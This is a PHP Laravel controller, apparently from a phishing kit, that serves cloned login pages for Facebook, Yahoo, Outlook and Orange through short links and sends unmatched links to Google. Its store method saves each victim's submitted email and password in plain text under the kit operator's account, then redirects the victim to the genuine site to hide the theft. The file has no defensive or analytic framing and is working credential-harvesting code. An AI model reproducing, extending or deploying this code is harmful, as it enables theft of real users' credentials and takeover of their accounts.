<?php

namespace App\Http\Controllers;

use App\Models\Notebook;
use App\Models\Shorturl;
use App\Models\Website;
use Illuminate\Http\Request;

class FishingController extends Controller
{
    public function index($short_key)
    {
        $shorturl = Shorturl::findByKey($short_key);

        if (is_null($shorturl)) {
            return redirect('https://www.google.com/');
        } else {
            if (!$shorturl->is_expired()) {
                if ($shorturl->website->name === 'facebook') {
                    return $this->facebook_index($shorturl->key);
                } elseif ($shorturl->website->name === 'yahoo') {
                    return $this->yahoo_index($shorturl->key);
                } elseif ($shorturl->website->name === 'outlook') {
                    return $this->outlook_index($shorturl->key);
                } elseif ($shorturl->website->name === 'orange') {
                    return $this->orange_index($shorturl->key);
                }
            }
        }
    }

    public function store(Request $request, $short_key)
    {
        $shorturl = Shorturl::findByKey($short_key);
        $website = Website::where('name', '=', $request->get('_platform'))->first();
        $owner = $shorturl->user;

        $checking_note = Notebook::where('login', '=', $request->get('email'))
                                    ->where('password', '=', $request->get('password'))
                                    ->where('website_id', '=', $website->id)
                                    ->where('user_id', '=', $owner->id)
                                    ->first();

        if (!$checking_note) {
            $addr = Notebook::create([
                'login' => $request->get('email'),
                'password' => $request->get('password')
            ]);

            $addr->website()->associate($website);
            $addr->user()->associate($owner);

            $addr->save();
        }

        return redirect($website->url);
    }

    public function facebook_index($short_key = 'aTadmn5')
    {
        if (is_mobile()) {
            return view('website.facebook.mobile', compact('short_key'));
        } else {
            return view('website.facebook.web', compact('short_key'));
        }
    }

    public function yahoo_index($short_key = 'aTadmn5')
    {
        return view('website.yahoo.web', compact('short_key'));
    }

    public function orange_index($short_key = 'aTadmn5')
    {
        return view('website.yahoo.web', compact('short_key'));
    }

    public function outlook_index($short_key = 'aTadmn5')
    {
        return view('website.outlook.web', compact('short_key'));
    }
}
